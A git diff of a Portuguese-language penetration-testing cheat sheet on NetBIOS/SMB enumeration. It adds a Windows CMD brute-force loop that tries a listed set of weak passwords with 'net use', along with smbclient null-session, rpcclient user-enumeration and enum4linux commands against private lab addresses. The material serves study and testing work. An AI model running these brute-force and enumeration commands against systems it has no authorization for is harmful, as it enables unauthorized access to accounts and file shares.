@@ -159,7 +159,7 @@ print (cmd)
 
 NMAP
 
-`nmap -v -sV -p139,445 -Pn --open 192.168.0.1/24`
+`nmap -v -sV -p139,445 -Pn --open 192.168.0.0/24`
 
 WINDOWS - CMD
 
@@ -202,6 +202,135 @@ Desmontando um mapeamento
 Deletando uma conexão estabelecida
 
 `net use \\192.168.0.1 /delete`
+
+## Trick: Brute Force via prompt do Windows
+
+**senhas.txt** = 
+123456
+rede
+admin
+network
+password
+Rede123
+
+**nome_usuario** = rafaela
+
+CMD
+
+Exemplo de brute force 01:
+
+`for /f %i in (senha.txt) do net use \\192.168.0.14 %i /u:nome_usuario`
+
+Exemplo de brute force 02:
+
+**users_senhas.txt** =
+
+admin 123456
+
+rafaela Rede123
+
+`for /f "tokens=1,2" %i in (senha.txt) do net use \\192.168.0.14 %j /u:%i`
+
+## Enumerando NetBIOS/SMB via Linux
+
+Indentificando hosts que possuem tais portas abertas com NMAP
+
+`nmap -v -sV -p139,445 -Pn --open 192.168.0.0/24`
+
+Scanneando com o NBTSCAN
+
+`nbtscan -r 192.168.0.0/24`
+
+Scanneando um host especifico com o SMBCLIENT
+
+`smbclient -L \\192.168.0.1`
+
+Interagindo com a sessão via Session Null
+
+`smbclient -L \\192.168.0.1 -N`
+
+Definindo apenas o nome de usuario
+
+`smbclient -L \\192.168.0.1 -N -U nome_usuario`
+
+Se conectando com um diretorio localizado
+
+`smbclient //192.168.0.1/diretorio -N`
+
+**CASO TENHA ALGUM PROBLEMA AO EXECUTAR OS COMANDO ACIMA FIQUE ATENTO A VERSÃO DO SOFTWARE.**
+
+*Algumas soluções, seria acresentar mais alguns parâmentros:*
+
+` smbclient -L \\192.168.0.1 -N --option='client min protocol=NT1'`
+
+## Enumerando com RPC
+
+Acessando manual
+
+`man rpcclient`
+
+`rṕcclient --help`
+
+Se conectando
+
+`rpcclient -U "" -N 192.168.0.1`
+
+Dicas de comandos
+
+`?`
+
+Listando usuario da maquina
+
+`enumdomusers`
+
+Obtendo informações de um usuário especifico
+
+`queryuser root`
+
+Listando compartilhamentos da maquina acessada
+
+`netshareenum`
+
+Conectando utilziando um usurio especifico
+
+`rpcclient -U "nome_usuario" 192.168.0.1`
+
+Conectando utilziando um usurio e senha
+
+`rpcclient -U "nome_usuario" 192.168.0.1 -p "senha" ` 
+
+
+## Automatizando a enumeração NetBIOS/SMB
+
+Ferramenta de automatização de enumeração
+
+`enum4linux`
+
+Obtendo o maximo de informação
+
+`enum4linux -A 192.168.0.1`
+
+Utilizando a ferramenta para trazer informações dos usuarios
+
+`enum4linux -U 192.168.0.1`
+
+Obtendo informações de compartilhamento
+
+`enum4linux -S 192.168.0.1`
+
+
+## Scripts para enumeração NetBIOS/SMB
+
+
+
+
+
+
+
+
+
+
+
 
 
 
